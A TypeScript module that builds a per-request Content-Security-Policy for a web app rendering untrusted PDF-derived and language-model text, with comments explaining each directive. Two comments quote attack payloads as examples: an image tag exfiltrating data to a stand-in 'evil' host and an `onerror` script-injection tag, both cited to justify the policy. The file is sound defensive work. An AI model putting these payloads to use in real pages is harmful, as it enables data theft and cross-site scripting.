/**
 * The Content-Security-Policy for rendered pages — PRD §9.13.
 *
 * This is the layer PRD v1.2 recorded as a factual error and fixed: Helmet in
 * the Express API sets headers on `/api/*` JSON responses, and browsers apply
 * CSP to documents, not to JSON. Relying on Helmet alone leaves every rendered
 * page with no CSP at all — precisely the pages that render text extracted from
 * untrusted third-party PDFs and produced by a language model.
 *
 * It is defence-in-depth BEHIND sanitisation, not instead of it. Its absence
 * produces no error and fails no test, so it has to be verified deliberately
 * against a real HTML response (see the CSP checks in the frontend test suite).
 */

/** Directives that never vary between environments. */
const SHARED = {
  'default-src': ["'self'"],
  /**
   * Radix (via shadcn/ui) positions Popover, DropdownMenu, Dialog and Tooltip
   * by writing inline `style="..."` ATTRIBUTES. Attributes cannot carry a
   * nonce, so `style-src-attr` must allow them or every dropdown renders at
   * 0,0. This is far cheaper than `script-src 'unsafe-inline'`: it permits
   * styling, not execution. The residual gap is closed by excluding `style`
   * from the sanitiser's attribute allowlist.
   */
  'style-src-attr': ["'unsafe-inline'"],
  /**
   * `blob:` is required because authenticated documents cannot be rendered via
   * <iframe> or <embed>: `GET /documents/:id/file` needs a bearer header the
   * browser will not attach to a subresource, and sets Content-Disposition:
   * attachment. Previews are fetched, turned into a Blob, and drawn — so blob:
   * URLs must be loadable. `https:` is deliberately absent: a wildcard there
   * would let document-derived markup exfiltrate via <img src="https://evil/?d=">.
   */
  'img-src': ["'self'", 'blob:', 'data:'],
  'font-src': ["'self'", 'data:'],
  /** pdf.js instantiates its worker from a blob URL. */
  'worker-src': ["'self'", 'blob:'],
  /** No <object>/<embed> anywhere; PDF rendering goes through canvas. */
  'object-src': ["'none'"],
  'frame-src': ["'none'"],
  'frame-ancestors': ["'none'"],
  /** An injected <base href> silently repoints every relative URL on the page. */
  'base-uri': ["'none'"],
  'form-action': ["'self'"],
  'manifest-src': ["'self'"],
} satisfies Record<string, string[]>;

/**
 * Build the policy for one request.
 *
 * @param nonce      per-request nonce, base64
 * @param isDev      development needs eval and a websocket for HMR; production
 *                   must have neither, and a test asserts that.
 */
export function buildCsp(nonce: string, isDev: boolean): string {
  const directives: Record<string, string[]> = {
    ...SHARED,

    /**
     * `'strict-dynamic'` is load-bearing, not decorative: the bundler loads
     * lazy chunks by creating <script> elements, and those inherit trust only
     * under strict-dynamic. A side effect worth knowing — CSP3 browsers then
     * ignore the `'self'` source expression here, so a route that forgets the
     * nonce fails loudly rather than silently downgrading.
     */
    'script-src': isDev
      ? ["'self'", `'nonce-${nonce}'`, "'strict-dynamic'", "'unsafe-eval'"]
      : ["'self'", `'nonce-${nonce}'`, "'strict-dynamic'"],

    /**
     * Blocks every inline event handler. `<img src=x onerror=...>` is exactly
     * the payload shape a poisoned PDF yields, and this kills it even if the
     * sanitiser is misconfigured — which is the entire point of a second layer.
     */
    'script-src-attr': ["'none'"],

    /**
     * Development deliberately omits the nonce.
     *
     * CSP3 says a nonce and `'unsafe-inline'` cannot coexist: once a nonce is
     * present the browser IGNORES `'unsafe-inline'` entirely. Listing both — as
     * this did — produces a policy that looks permissive and behaves strictly,
     * so the dev server's own injected <style> elements were blocked and the
     * console filled with "Applying inline style violates..." while the header
     * appeared to allow it.
     *
     * So dev drops the nonce and keeps `'unsafe-inline'`, which actually works;
     * production keeps the nonce and never permits inline styles. The same
     * either/or is why `script-src` above never lists both.
     */
    'style-src': isDev ? ["'self'", "'unsafe-inline'"] : ["'self'", `'nonce-${nonce}'`],

    /**
     * `'self'` only, and that is the payoff of the same-site topology (§11.9):
     * the API is same-origin through the Next rewrite, so this never needs
     * widening. It doubles as a tripwire — if anyone later points the client
     * straight at the Express origin, the app breaks immediately and visibly
     * instead of quietly working until the cookie stops being sent.
     */
    'connect-src': isDev ? ["'self'", 'ws:', 'http://localhost:*'] : ["'self'"],
  };

  const policy = Object.entries(directives)
    .map(([name, values]) => `${name} ${values.join(' ')}`)
    .join('; ');

  return isDev ? policy : `${policy}; upgrade-insecure-requests`;
}
